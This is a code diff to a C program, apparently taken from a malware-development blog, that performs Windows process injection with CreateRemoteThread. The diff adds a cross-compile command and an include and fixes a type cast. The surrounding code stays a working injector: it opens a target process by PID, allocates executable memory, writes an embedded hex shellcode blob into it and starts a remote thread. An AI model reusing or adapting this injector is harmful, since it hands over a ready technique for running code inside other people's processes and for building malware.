@@ -1,6 +1,8 @@
 // https://www.zerodetection.net/blog/exploring-createremotethread-injection-a-powerful-technique-in-malware-development
+// x86_64-w64-mingw32-gcc createremotethread.c -o crt.exe
 
 #include "windows.h"
+#include <stdio.h>
 
 int main(int argc, char *argv[])
 {
@@ -29,16 +31,16 @@ int main(int argc, char *argv[])
   "\x6f\x6e\x00\x7a\x65\x72\x6f\x64\x65\x74\x65\x63\x74\x69"
   "\x6f\x6e\x00\x75\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00";
 
-	HANDLE processHandle;
-	HANDLE remoteThread;
-	PVOID remoteBuffer;
+        HANDLE processHandle;
+        HANDLE remoteThread;
+        PVOID remoteBuffer;
 
-	printf("Injecting to PID: %i", atoi(argv[1]));
-	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
-	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
-	WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
-	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
-	CloseHandle(processHandle);
+        printf("Injecting to PID: %i", atoi(argv[1]));
+        processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, atoi(argv[1]));
+        remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+        WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
+        remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
+        CloseHandle(processHandle);
 
     return 0;
 }
